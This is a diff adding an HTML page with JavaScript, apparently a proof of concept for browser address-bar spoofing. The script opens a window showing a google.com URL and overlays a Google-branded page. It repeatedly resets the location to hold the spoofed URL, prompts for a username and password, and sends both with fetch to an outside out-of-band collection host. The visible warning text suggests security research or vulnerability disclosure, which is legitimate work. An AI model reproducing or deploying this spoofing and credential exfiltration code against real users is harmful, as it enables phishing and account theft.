@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<body>
+<button onclick="spoof()">Click to spoof</button>
+<script>
+function spoof() {
+    let win = window.open("https://www.google.com:8080", "_blank");  // Open invalid port to show spoofed URL first
+    setTimeout(() => {
+        try {
+            win.stop();  // Stop any ongoing load to retain URL
+            // Create full-screen iframe for payload to avoid document.write redirect
+            let iframe = win.document.createElement('iframe');
+            iframe.style.position = 'fixed';
+            iframe.style.top = '0';
+            iframe.style.left = '0';
+            iframe.style.width = '100%';
+            iframe.style.height = '100%';
+            iframe.style.border = 'none';
+            iframe.style.background = 'white';
+            iframe.srcdoc = '<div style="text-align:center; font-family:Arial, sans-serif;">' +
+                '<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;">' +
+                '<h1>This is NOT Google!</h1>' +
+                '<p>Please enter your credentials:</p>' +
+                '</div>';
+            win.document.body.appendChild(iframe);
+            // Add setInterval to repeatedly "lock" the URL after injection
+            setInterval(() => {
+                win.location.replace("https://www.google.com:8080");
+            }, 50);  // Every 50ms to prevent redirect to blank
+            // Add credential prompts after content is visible
+            setTimeout(() => {
+                let u = prompt('Enter your username:');
+                let p = prompt('Enter your password:');
+                let exfilUrl = 'https://oxomzauseuatgjlyyqtdkiq3v0vsnm0p5.oast.fun/collect?username=' + encodeURIComponent(u) + '&password=' + encodeURIComponent(p);
+                fetch(exfilUrl).catch(e => console.log("Exfiltration blocked:", e));
+                alert('Your creds:\\nUsername: ' + u + '\\nPassword: ' + p);
+            }, 1000);  // Increased delay to ensure spoofed URL and content show before prompt
+        } catch (e) {
+            console.warn("Blocked:", e);
+        }
+    }, 200);  // Slight delay for timing the URL display first
+}
+</script>
+</body>
+</html>
